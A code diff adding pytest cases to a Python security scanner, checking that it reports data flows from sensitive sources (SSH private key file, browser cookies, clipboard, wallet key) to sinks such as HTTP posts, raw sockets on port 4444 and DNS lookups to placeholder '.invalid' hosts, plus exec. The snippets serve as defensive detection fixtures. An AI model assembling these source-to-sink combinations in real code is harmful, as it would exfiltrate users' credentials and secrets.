@@ -3,7 +3,11 @@
 from __future__ import annotations
 
 import ast
+from typing import ClassVar
 
+import pytest
+
+from cordon_scanner.analysis.python.measure.flows import PythonMeasureFlows
 from cordon_scanner.analysis.python.py_flow import IndexShape
 from cordon_scanner.analysis.python.py_flow_facts import PythonFlowFacts
 
@@ -186,3 +190,73 @@ class TestWrittenLinesOncePerTree:
         first = PythonPersistence.written_lines(tree)
         assert PythonPersistence.written_lines(tree) == first
         assert runs == [1]
+
+
+class PyPairs:
+    """One snippet for each of the nine source kinds (it declares `v`) and one for each of the six sink kinds (it uses `v`), put together a pair at a time."""
+
+    SOURCES: ClassVar[dict[str, str]] = {
+        "secret_file": 'v = open(os.path.join(os.path.expanduser("~"), ".ssh", "id_" + "rsa")).read()\n',
+        "home_file": 'v = open(os.path.join(os.path.expanduser("~"), "notes.txt")).read()\n',
+        "network_response": 'r = requests.get("https://api.invalid/x")\nv = r.text\n',
+        "decoded": 'v = base64.b64decode("aGVsbG8gd29ybGQ=")\n',
+        "environment": 'v = os.environ.get("HOME")\n',
+        "identity": "v = socket.gethostname()\n",
+        "browser": "v = browser_cookie3.chrome()\n",
+        "clipboard": "v = pyperclip.paste()\n",
+        "wallet_key": "v = private_key\n",
+    }
+    SINKS: ClassVar[dict[str, str]] = {
+        "request": 'requests.post("https://h.invalid/u", data=v)\n',
+        "connection": 's = socket.create_connection(("h.invalid", 4444))\ns.sendall(v)\n',
+        "dns": 'socket.gethostbyname(str(v) + ".x.invalid")\n',
+        "process": 'subprocess.run(["ffmpeg", "-i", v])\n',
+        "file": 'open("/tmp/x.bin", "wb").write(v)\n',
+        "execute": "exec(v)\n",
+    }
+
+    @classmethod
+    def program(cls, source: str, sink: str) -> str:
+        body = "".join(
+            f"    {line}\n" for line in (cls.SOURCES[source] + cls.SINKS[sink]).splitlines()
+        )
+        return f"import base64, os, socket, subprocess\n\n\ndef go(private_key):\n{body}"
+
+
+class TestEverySourceReachesEverySink:
+    """The nine source kinds against the six sink kinds, one pair a case, read the way a measurement run reads a Python file."""
+
+    @pytest.mark.parametrize("sink", list(PyPairs.SINKS))
+    @pytest.mark.parametrize("source", list(PyPairs.SOURCES))
+    def test_the_pair_is_reported(self, source: str, sink: str) -> None:
+        found = {(s, k) for s, k, _ in PythonMeasureFlows.of(PyPairs.program(source, sink))}
+        assert (source, sink) in found, sorted(found)
+
+    def test_the_scan_s_own_facts_do_not_carry_the_new_sources_or_sinks(self) -> None:
+        for source in PyPairs.SOURCES:
+            for sink in PyPairs.SINKS:
+                text = PyPairs.program(source, sink)
+                assert all(
+                    s in PythonFlowFacts.KINDS and k in PythonFlowFacts.SINKS
+                    for s, k, _ in PythonFlowFacts.of(text)
+                )
+
+
+class TestTheFileSinkForms:
+    FORMS: ClassVar[dict[str, str]] = {
+        "open for writing": 'open(v, "wb")\n',
+        "write the content": 'open("/tmp/x.bin", "wb").write(v)\n',
+        "write_text": 'pathlib.Path("/tmp/x.txt").write_text(v)\n',
+        "write_bytes on the path": "pathlib.Path(v).write_bytes(b'x')\n",
+        "copy to the destination": 'shutil.copy("/etc/hosts", v)\n',
+        "os.open": "os.open(v, os.O_WRONLY)\n",
+    }
+
+    @pytest.mark.parametrize("form", list(FORMS))
+    def test_a_value_reaching_the_path_or_the_content_is_a_file_flow(self, form: str) -> None:
+        text = f"import os, pathlib, shutil\n\n\ndef go():\n    v = os.environ.get('HOME')\n    {self.FORMS[form]}"
+        assert ("environment", "file", "unknown") in PythonMeasureFlows.of(text)
+
+    def test_a_write_of_a_constant_is_no_flow(self) -> None:
+        text = "def go():\n    open('/tmp/x.txt', 'w').write('hello')\n"
+        assert PythonMeasureFlows.of(text) == set()
